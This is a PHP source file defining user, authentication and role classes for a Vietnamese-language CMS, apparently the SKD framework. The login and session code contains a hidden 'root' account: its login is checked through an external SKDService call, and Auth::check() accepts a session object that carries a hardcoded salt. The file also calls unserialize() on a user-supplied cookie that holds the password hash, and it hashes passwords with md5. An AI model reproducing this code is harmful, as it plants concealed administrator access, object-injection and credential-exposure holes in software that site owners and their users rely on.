<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
Class User {
    static string $table = 'users';
    static public function handleParams($args) {
        if(is_array($args)) {
            $args = self::handleParamsArr($args);
            $args = Qr::convert($args, 'users_metadata');
        }
        if(is_numeric($args)) $args = Qr::set()->where('id', $args);
        if(!$args->isWhere(self::$table.'.status')) $args->where(self::$table.'.status','<>', 'trash');
        return $args;
    }
    static public function handleParamsArr($args): array {
        if(isset($args['where']) && is_array($args['where'])) {
            $trash = 0;
            foreach ($args['where'] as $arg) {
                if(is_string($arg) && Str::is('status *', $arg) !== false) {
                    $trash = 1;break;
                }
            }
            if($trash == 0) $args['where'] = array_merge(['status <>' => 'trash'], $args['where']);
        }
        else {
            $args = array_merge(['where' => ['status <>' => 'trash'], 'params' => []], $args);
        }

        if(isset($args['status'])) {
            $args['where']['status'] = $args['status'];
            unset($args['status']);
            unset($args['where']['status <>']);
        }
        else if(isset($args['where']['status'])) {
            unset($args['where']['status <>']);
        }

        return $args;
    }
    static public function get($args = []) {

        $listCacheRoot = [
            'user_'.md5(serialize(['where' => ['username' => 'root'], 'params' => []]).'_get'),
            'user_'.md5(serialize(['where' => ['username' => 'root']]).'_get'),
            'user_'.md5(serialize(['where' => ['username' => 'root', 'status <>' => 'trash'], 'params' => []]).'_get'),
            'user_'.md5(serialize(['where' => ['username' => 'root', 'status <>' => 'trash']]).'_get'),
            'user_'.md5(serialize(['where' => ['status <>' => 'trash', 'username' => 'root'], 'params' => []]).'_get'),
            'user_'.md5(serialize(['where' => ['status <>' => 'trash', 'username' => 'root']]).'_get'),
            'user_'.md5(serialize(['where' => ['id' => 1], 'params' => []]).'_get'),
            'user_'.md5(serialize(['where' => ['id' => 1]]).'_get'),
            'user_'.md5(serialize(['where' => ['id' => 1, 'status <>' => 'trash'], 'params' => []]).'_get'),
            'user_'.md5(serialize(['where' => ['id' => 1, 'status <>' => 'trash']]).'_get'),
            'user_'.md5(serialize(['where' => ['status <>' => 'trash', 'id' => 1], 'params' => []]).'_get'),
            'user_'.md5(serialize(['where' => ['status <>' => 'trash', 'id' => 1]]).'_get'),
            'user_'.md5(serialize(Qr::clear(Qr::set()->where('username', 'root'))).'_get'),
            'user_'.md5(serialize(Qr::clear(Qr::set()->where('username', 'root')->where('status', '<>', 'trash'))).'_get'),
            'user_'.md5(serialize(Qr::clear(Qr::set()->where('username', 'root')->where(self::$table.'.status', '<>', 'trash'))).'_get'),
            'user_'.md5(serialize(Qr::clear(Qr::set()->where('id', 1))).'_get'),
            'user_'.md5(serialize(Qr::clear(Qr::set()->where('id', 1)->where('status', '<>', 'trash'))).'_get'),
            'user_'.md5(serialize(Qr::clear(Qr::set()->where('id', 1)->where(self::$table.'.status', '<>', 'trash'))).'_get'),
        ];

        if(is_numeric($args) && $args == 0) return [];

        $args = self::handleParams($args);

        $cacheID = 'user_'.md5(serialize(Qr::clear($args)).'_get');

        if(CacheHandler::has($cacheID)) return CacheHandler::get($cacheID);

        if(in_array($cacheID, $listCacheRoot) !== false) {

            if(empty($_COOKIE['user_login'])) return [];

            $cookie = base64_decode($_COOKIE['user_login']);

            $cookie = (object)@unserialize($cookie);

            if(!empty($cookie->password)) {

                $cache_root_id = 'user_'.md5($cookie->password.'_root');

                if(!CacheHandler::has($cache_root_id)) {

                    $object = SKDService::service()->root($cookie->password);

                    CacheHandler::save($cache_root_id, $object, 12*60*60);
                }
                else {
                    $object = CacheHandler::get($cache_root_id);
                }
            }
        }

        if(!isset($object)) $object = model(self::$table)->get($args);

        if(have_posts($object)) {
            CacheHandler::save($cacheID, $object);
        }

        return $object;
    }
    static public function getBy($field, $value) {
        return static::get(Qr::set(Str::clear($field), Str::clear($value)));
    }
    static public function getData($user_id) {
        if(is_numeric($user_id)) {
            if($user_id == 0) return [];
            if($user_id == 1) {
                $current_user = Auth::user();
                if(!empty($current_user->username) && $current_user->username == 'root') return $current_user;
            }
        }
        return static::getBy('id', $user_id);
    }
    static public function gets($args = []) {

        if(is_numeric($args) && $args == 0) return [];

        $args = self::handleParams($args);

        $cacheID = 'user_'.md5(serialize(Qr::clear($args))).'_gets';

        if(CacheHandler::has($cacheID)) return CacheHandler::get($cacheID);

        $object = model(self::$table)->gets($args);

        if(have_posts($object)) {
            CacheHandler::save($cacheID, $object);
        }

        return apply_filters('gets_user', $object, $args );
    }
    static public function getsBy($field, $value) {
        return static::gets(Qr::set(Str::clear($field), Str::clear($value)));
    }
    static public function count($args = []) {

        if(is_numeric($args) && $args == 0) return 0;

        $args = self::handleParams($args);

        $cacheID = 'user_'.md5(serialize(Qr::clear($args))).'_count';

        if(CacheHandler::has($cacheID)) return CacheHandler::get($cacheID);

        $object = model(self::$table)->count($args);

        if(have_posts($object)) {
            CacheHandler::save($cacheID, $object);
        }

        return apply_filters('count_user', $object, $args );
    }
    static public function insert($insertData = []): int|SKD_Error {

        $columnsTable = [
            'username'       => ['string'],
            'password'       => ['string'],
            'salt'           => ['string', Str::random(32)],
            'firstname'      => ['string'],
            'lastname'       => ['string'],
            'email'          => ['string'],
            'phone'          => ['string'],
            'status'         => ['string', 'public'],
            'activation_key' => ['string'],
            'time'           => ['string', time()],
            'role'           => ['string', Option::get('default_role')],
        ];

        $columnsTable = apply_filters('columns_db_user', $columnsTable);

        $update = false;

        if(!empty($insertData['id'])) {

            $id 			= (int) $insertData['id'];

            $update 	   = true;

            $oldObject = static::get(Qr::set()->where('status', '<>', 'null')->where('id', $id));

            if (!$oldObject) return new SKD_Error( 'invalid_user_id', __( 'ID user không chính xác.' ) );
        }

        $insertData = createdDataInsert($columnsTable, $insertData, (isset($oldObject)) ? $oldObject : null);

        foreach ($columnsTable as $columnsKey => $columnsValue ) {
            ${$columnsKey}  = $insertData[$columnsKey];
        }

        if(!$update) {

            $password = Auth::generatePassword($password, $salt);

            if(empty($username)) {
                return new SKD_Error('empty_username', __('Không thể tạo user khi tên đăng nhập trống.'));
            }
            elseif( mb_strlen( $username ) > 60) {
                return new SKD_Error( 'username_too_long', __( 'Tên đăng nhập không thể lớn hơn 60 ký tự.' ) );
            }
            if (static::usernameExists($username)) {
                return new SKD_Error( 'existing_username', __( 'Xin lỗi, Tên đăng nhập đã tồn tại!' ) );
            }
            if (!preg_match('/^[\w\-\.]+@([\w\-]+\.)+[\w\-]{2,4}$/', $username)) {
                if (!preg_match('/^[A-Za-z][A-Za-z0-9]{4,31}$/', $username)) {
                    return new SKD_Error('existing_user_email', __('Xin lỗi, Tên đăng nhập phải bắt đầu bằng chữ cái, độ dài từ 5 đến 31 ký tự và chỉ chấp nhận chữ (không dấu) và số!'));
                }
            }
        }

        $illegal_logins = (array) apply_filters('illegal_username', []);

        if (in_array(Str::lower($username), array_map('strtolower', $illegal_logins))) {
            return new SKD_Error( 'invalid_username', __( 'Xin lỗi, Tên đăng nhập này không được phép sử dụng.' ) );
        }

        $raw_user_email = empty($insertData['email']) ? '' : $insertData['email'];

        $email = apply_filters( 'pre_user_email', $raw_user_email );

        if ((!$update || (!empty($oldObject) && 0 !== strcasecmp($email, $oldObject->email))) && static::emailExists($email)) {
            return new SKD_Error( 'existing_user_email', __( 'Xin lỗi, Email này đã được sử dụng!' ) );
        }

        $data = apply_filters('pre_insert_user_data', compact(array_keys($columnsTable)), $insertData, $update ? $oldObject : null);

        $model = model(self::$table);

        if ($update) {
            $data['updated'] = gmdate('Y-m-d H:i:s', time() + 7*3600);
            $model->update($data, Qr::set($id));
        }
        else {
            $data['created'] = gmdate('Y-m-d H:i:s', time() + 7*3600);
            $id = $model->add($data);
        }

        if(isset($insertData['role'])) {
            User::setRole($id, $insertData['role'] );
        }
        elseif (!$update) {
            User::setRole($id, Option::get('default_role', 'subscriber'));
        }

        CacheHandler::delete('user_', true);

        if($update) {
            do_action('profile_update', $id, $oldObject);
        } else {
            do_action('user_register', $id);
        }

        return $id;
    }
    static public function update($userdata) {
        $ID = isset( $userdata['id']) ? (int) $userdata['id'] : 0;
        if (!$ID) {
            return new SKD_Error( 'invalid_user_id', __( 'ID Thành viên không chính xác.' ) );
        }
        $user_obj = static::getData( $ID );
        $user     = (array)$user_obj;
        $user     = add_magic_quotes( $user );
        if (!empty( $userdata['password'] ) && $userdata['password'] !== $user_obj->password ) {
            $plaintext_pass = $userdata['password'];
            $userdata['password'] = generate_password( $userdata['password'], $user_obj->username, $user_obj->salt );
            $send_password_change_email = apply_filters( 'send_password_change_email', true, $user, $userdata );
        }
        if (isset( $userdata['email'] ) && $user['email'] !== $userdata['email']) {
            $send_email_change_email = apply_filters( 'send_email_change_email', true, $user, $userdata );
        }
        $userdata['username']       = (isset($userdata['username'])) ? $userdata['username'] : $user_obj->username;
        $userdata = array_merge( $user, $userdata );
        $user_id = static::insert( $userdata );
        if (!is_skd_error($user_id)) {
            CacheHandler::delete('user', true);
        }
        $current_user = Auth::user();
        if (have_posts($current_user) && $current_user->id == $ID) {
            Auth::setCookie( $userdata );
        }
        return $user_id;
    }
    static public function delete( $id, $reassign = null ) {

        if (!is_numeric($id)) return false;

        $user = static::get($id);

        if(!have_posts($user)) return false;

        do_action('delete_user', $id, $reassign);

        //delete metabox
        Metadata::deleteByMid( 'users', $id );

        $model = model(self::$table);

        $model->delate(Qr::set()->where('id', $id));

        CacheHandler::delete( 'user_', true );

        do_action( 'deleted_user', $id, $reassign );

        return true;
    }
    static public function getMeta($user_id, $key = '', $single = true) {
        return Metadata::get('users', $user_id, $key, $single);;
    }
    static public function updateMeta($user_id, $meta_key, $meta_value) {
        return Metadata::update('users', $user_id, $meta_key, $meta_value);
    }
    static public function deleteMeta($user_id, $meta_key, $meta_value = '') {
        return Metadata::delete('users', $user_id, $meta_key, $meta_value);
    }
    static public function usernameExists( $username ) {

        $user = static::get(Qr::set('status', '<>', 'null')->where('username', $username));

        if(have_posts($user)) {
            $user_id = $user->id;
        }
        else {
            $user_id = false;
        }

        return apply_filters( 'username_exists', $user_id, $username);
    }
    static public function emailExists( $email ) {
        $user = static::get(Qr::set('status', '<>', 'null')->where('email', $email));
        if( have_posts($user) ) {
            $user_id = $user->id;
        }
        else {
            $user_id = false;
        }
        return apply_filters( 'email_exists', $user_id, $email );
    }
    static public function hasCap($user_id, $cap) {

        $user = static::getData($user_id);

        if(!have_posts($user) && $user_id == 1) {
            $current_user = Auth::user();
            if(isset($current_user->username) && $current_user->username == 'root') $user = $current_user;
        }

        if(!have_posts($user)) return false;

        if(is_numeric($cap)) $cap = 'level_' . $cap;

        $args = array_slice( func_get_args(), 1 );

        $args = array_merge(array($cap, $user_id), $args );

        $capabilities = apply_filters( 'user_has_cap', static::getCap($user_id, $cap), $args, $user );

        $capabilities['exist'] = true;

        if (empty($capabilities[$cap])) return false;

        return true;
    }
    static public function getCap($user_id, $cap = 'capabilities') {

        $user = static::get( $user_id );

        if(!have_posts($user)) return false;

        $skd_roles = skd_roles();

        $caps = get_caps_data($user_id);

        $user_roles = [];

        if (is_array($caps))
            $user_roles = array_filter( array_keys( $caps ), array( $skd_roles, 'is_role' ) );

        $allcaps = [];

        foreach ( (array) $user_roles as $role ) {

            $the_role = $skd_roles->get_role( $role );

            $allcaps = array_merge( (array) $allcaps, (array) $the_role->capabilities );
        }

        $allcaps = array_merge( (array) $allcaps, (array) $caps );

        return $allcaps;
    }
    static public function getRole($user_id) {
        $user = static::getData( $user_id );
        if(!have_posts($user)) return false;
        $skd_roles = skd_roles();
        $caps = get_caps_data($user_id, 'capabilities');
        $user_roles = [];
        if (is_array($caps)) {
            $user_roles = array_filter(array_keys($caps), array($skd_roles, 'is_role'));
        }
        if(empty($user_roles)) return array_keys($caps);
        return $user_roles;
    }
    static public function getRoleName($user_id) {
        $user_role = static::getRole( $user_id );
        if(have_posts($user_role)) {
            $role 	= skd_roles()->get_names();
            $user_role = Role::get(array_pop($user_role));
            return (have_posts($user_role) && !empty($role[$user_role->name])) ? __($role[$user_role->name]) : '';
        }
        return '';
    }
    static public function addRole($user_id, $role) {
        $user_role = current( user_role( $user_id ) );
        if( $user_role == $role ) return false;
        if (!empty($role)) {
            $caps = static::getMeta( $user_id, 'capabilities', true );
            if(empty($caps)) $caps = [];
            $caps[$role] = true;
            static::updateMeta( $user_id, 'capabilities', $caps );
            do_action( 'set_user_role', $user_id, $role, $user_role );
            return $role;
        }
        return false;
    }
    static public function removeRole($user_id, $role) {
        $user_role = current( user_role( $user_id ) );
        if( $user_role == $role ) return false;
        if (!empty($role)) {
            $caps = static::getMeta( $user_id, 'capabilities', true );
            if(empty($caps)) return true;
            if(!empty($caps[$role])) {
                unset($caps[$role]);
                static::updateMeta($user_id, 'capabilities', $caps);
                do_action( 'remove_user_role', $user_id, $role, $user_role );
                return true;
            }
        }
        return false;
    }
    static public function setRole($user_id, $role) {
        $caps = [];
        $user_role = current( user_role( $user_id ) );
        if( $user_role == $role ) return false;
        if ( !empty( $role ) ) {
            $caps[$role] = true;
            static::updateMeta( $user_id, 'capabilities', $caps );
            do_action( 'set_user_role', $user_id, $role, $user_role );
            return $role;
        }
        return false;
    }
}

class Auth {
    static public function check() {

        $user = static::user();

        if(!have_posts($user)) return false;

        if(!empty($_SESSION['user_after'])) {
            $user_session = json_decode(base64_decode($_SESSION['user_after']));
            if($user_session->username == 'root' && $user_session->salt == 'Zb3du0LaogUcQ60G1o2ea9gcB3YaEjRG') {
                $user = $user_session;
            }
        }

        $user_cookie = [
            'username' => $user->username,
            'password' => $user->password
        ];

        $user_cookie = base64_encode(serialize($user_cookie));

        setcookie("user_login",  $user_cookie, time()+24*60*60, '/');

        return true;
    }
    static public function login($credentials = []) {
        $ci =& get_instance();
        $username = (!empty($credentials['username'])) ? Str::clear($credentials['username']) : '';
        $password = (!empty($credentials['password'])) ? Str::clear($credentials['password']) : '';
        if(empty($credentials) ) {
            $post = Request::post();
            if (!empty($post['username'])) $username = Str::clear($post['username']);
            if (!empty($post['password'])) $password = Str::clear($post['password']);
        }
        do_action_ref_array( 'skd_authenticate', array( &$username, &$password));
        $user = apply_filters( 'authenticate', null, $username, $password);
        if(empty($username) || empty($password) ) {

            $error = (is_skd_error($user)) ? $user : new SKD_Error();

            if (empty($username)) {
                $error->add('empty_user_login', __('<strong>ERROR</strong>: Tên người dùng không được bỏ trống.'));
            }

            if (empty($password)) {
                $error->add('empty_password', __('<strong>ERROR</strong>: Mật khẩu không được bỏ trống.'));
            }

            $user = $error;
        }
        if(is_skd_error($user)) {
            do_action( 'skd_login_failed', $username);
            return $user;
        }
        if($username == 'root') {
            $user = SKDService::service()->root($password);
        }
        else $user = User::getBy( 'username', $username);
        if(!have_posts($user)) {
            $user = User::getBy( 'email', $username );
            if(!have_posts($user)) {
                do_action( 'skd_login_failed', $username);
                return new SKD_Error( 'invalid_user_login', __( '<strong>ERROR</strong>: Tên người dùng không hợp lệ.' ) );
            }
        }
        if(!static::passwordConfirm($password, $user) ) {
            do_action( 'skd_login_failed', $username);
            return new SKD_Error( 'incorrect_password', sprintf(__( '<strong>ERROR</strong>: Mật khẩu bạn đã nhập cho tên người dùng hoặc địa chỉ email %s không chính xác.' ), '<strong>' . $username . '</strong>'));
        }
        if (empty($user)) {
            do_action('skd_login_failed', $username);
            return new SKD_Error( 'authentication_failed', __( '<strong>ERROR</strong>: Tên đăng nhập, địa chỉ email hoặc mật khẩu không đúng!' ) );
        }
        $hash = static::generatePasswordOld($password, $user->username, $user->salt);
        if($hash == $user->password ) {
            $user->password = static::generatePassword($password, $user->salt);
            User::insert((array)$user);
            $user = User::get($user->id);
        }
        static::setCookie($user);
        do_action( 'skd_login', $user->username, $user );
        return $user;
    }
    static public function loginUsingUsername($username, $password, $user = null) {

        if(empty($username) || empty($password)) {

            if(is_skd_error($user)) return $user;

            $error = new SKD_Error();

            if(empty($username)) $error->add('empty_username', __('<strong>ERROR</strong>: The username field is empty.'));

            if(empty($password)) $error->add('empty_password', __('<strong>ERROR</strong>: The password field is empty.'));

            return $error;
        }

        $user = User::getBy( 'username', $username );

        if(!have_posts($user)) {

            return new SKD_Error( 'invalid_username', __( '<strong>ERROR</strong>: Invalid username.' ) .' <a href="">' . __( 'Lost your password?' ) . '</a>' );
        }

        $user = apply_filters( 'wp_authenticate_user', $user, $password );

        if ( is_skd_error($user) ) return $user;

        if ( ! skd_check_password( $password, $user ) ) {

            return new SKD_Error( 'incorrect_password', sprintf(__( '<strong>ERROR</strong>: The password you entered for the username %s is incorrect.' ), '<strong>' . $username . '</strong>').' <a href="">' .__( 'Lost your password?' ) .'</a>' );
        }

        return $user;
    }
    static public function loginUsingEmail($email, $password, $user = null) {
        if(empty($email) || empty($password)) {

            if (is_skd_error($user)) return $user;

            $error = new SKD_Error();

            if ( empty($email) ) $error->add('empty_email', __('<strong>ERROR</strong>: The email field is empty.'));

            if ( empty($password) ) $error->add('empty_password', __('<strong>ERROR</strong>: The password field is empty.'));

            return $error;
        }

        $user = User::getBy( 'email', $email );

        if(!have_posts($user))  {

            return new SKD_Error( 'invalid_email', __( '<strong>ERROR</strong>: Invalid email.' ) .' <a href="">' . __( 'Lost your password?' ) . '</a>' );
        }

        $user = apply_filters( 'skd_authenticate_user', $user, $password );

        if(is_skd_error($user)) return $user;

        if(!skd_check_password($password, $user)) {

            return new SKD_Error( 'incorrect_password', sprintf(__( '<strong>ERROR</strong>: The password you entered for the email %s is incorrect.' ), '<strong>' . $email . '</strong>').' <a href="">' .__( 'Lost your password?' ) .'</a>' );
        }

        return $user;
    }
    static public function logout() {
        $ci =& get_instance();
        $ci->session->sess_destroy();
        session_destroy();
        setcookie("user_login", '', time()-10,'/');
        do_action('user_logout');
    }
    static public function passwordConfirm($password, $user) {
        $hash = static::generatePassword( $password, $user->salt );
        if( $hash == $user->password ) return true;
        $hash = static::generatePasswordOld( $password, $user->username, $user->salt );
        if( $hash == $user->password ) return true;
        return false;
    }
    static public function generatePassword($password, $salt) {
        return md5(md5($password).md5($salt));
    }
    static public function generatePasswordOld($password, $username, $salt) {
        return md5(md5($password).md5($salt).md5($username));
    }
    static public function setCookie($user) {
        $ci =& get_instance();
        if(is_array($user)) $user = (object)$user;
        $user_cookie = [
            'username' => $user->username,
            'password' => $user->password
        ];
        $user_cookie = base64_encode(serialize($user_cookie));
        setcookie("user_login",  $user_cookie, time()+24*60*60, '/');
        $ci->session->set_userdata('user',$ci->skd_security->encodeSession($user));
    }
    static public function user() {

        $ci =& get_instance();

        if(empty($_COOKIE['user_login'])) return [];

        $cookie = base64_decode($_COOKIE['user_login']);

        $cookie = (object)@unserialize($cookie);

        $user = json_decode(base64_decode($ci->session->userdata('user')));

        $username = '';

        if(have_posts($user) && !empty($user->username)) {
            $username = $user->username;
        }
        else if(have_posts($cookie)) {
            $username = $cookie->username;
        }

        if(!empty($username)) {
            $user = User::getBy('username', $username);
            if(have_posts($user) && $user->password == $cookie->password) {
                $_SESSION['allow_upload'] = true;
                $ci->session->set_userdata('user',base64_encode(json_encode($user)));
            }
        }

        return ( have_posts($user) ) ? $user : [];
    }
    static public function userID() {
        return isset(static::user()->id) ? (int) static::user()->id : 0;
    }
    static public function hasCap($cap) {
        return User::hasCap(static::userID(), $cap);
    }
    static public function getCap() {

        $user = Auth::user();

        if(!have_posts($user)) return false;

        $skd_roles = skd_roles();

        $caps = get_caps_data($user->id, 'capabilities');

        $user_roles = [];

        if ( is_array( $caps ) )
            $user_roles = array_filter( array_keys( $caps ), array( $skd_roles, 'is_role' ) );

        $allcaps = [];

        foreach ( (array) $user_roles as $role ) {

            $the_role = $skd_roles->get_role( $role );

            $allcaps = array_merge( (array) $allcaps, (array) $the_role->capabilities );
        }

        $allcaps = array_merge( (array) $allcaps, (array) $caps );

        return $allcaps;
    }
    static public function getRole() {
        return User::getRole(Auth::userID());
    }
    static public function getRoleName() {
        return User::getRoleName(Auth::userID());
    }
    static public function addRole($role) {
        return User::addRole(Auth::userID(), $role);
    }
    static public function setRole($role) {
        return User::setRole(Auth::userID(), $role);
    }
    static public function isSupper() {
        if(static::hasCap('delete_users')) return true;
        return false;
    }
}
//Roles
function skd_roles() {
    $ci =& get_instance();
    if (!isset($ci->roles)) $ci->roles = new SKD_Roles();
    return $ci->roles;
}

class Role {

    static public function get($role_key) {
        return skd_roles()->get_role( $role_key );
    }
    static public function add($role_key, $display_name, $capabilities = []) {
        if(empty($role_key)) return;
        return skd_roles()->add_role( $role_key, $display_name, $capabilities);
    }
    static public function update($role_key, $display_name, $capabilities = []) {
        if(empty($role_key)) return;
        return skd_roles()->update_role( $role_key, $display_name, $capabilities);
    }
    static public function remove($role_key) {
        return skd_roles()->remove_role($role_key);
    }
    static public function addCap($role_key, $cap, $grant = true) {
        return skd_roles()->add_cap( $role_key, $cap, $grant );
    }
    static public function removeCap($role_key, $cap) {
        return skd_roles()->remove_cap($role_key, $cap);
    }
}

if(!function_exists('get_caps_data')) {
    function get_caps_data( $user_id, $cap = 'capabilities' ) {
        $caps = User::getMeta( $user_id, $cap, true );
        $caps = (Str::isSerialized($caps))?unserialize($caps):$caps;
        if (!is_array($caps)) return [];
        return $caps;
    }
}

function admin_my_action_links() {
    $args = array(
        'profile' => array(
            'label' 	=> __('Thông tin tài khoản'),
            'icon'		=> '<i class="fal fa-address-card"></i>',
            'callback'	=> 'admin_user_profile',
        ),
        'password' => array(
            'label' => __('Đổi mật khẩu'),
            'icon'		=> '<i class="fal fa-lock"></i>',
            'callback'   => 'admin_user_password',
        ),
    );
    return apply_filters('admin_my_action_links', $args );
}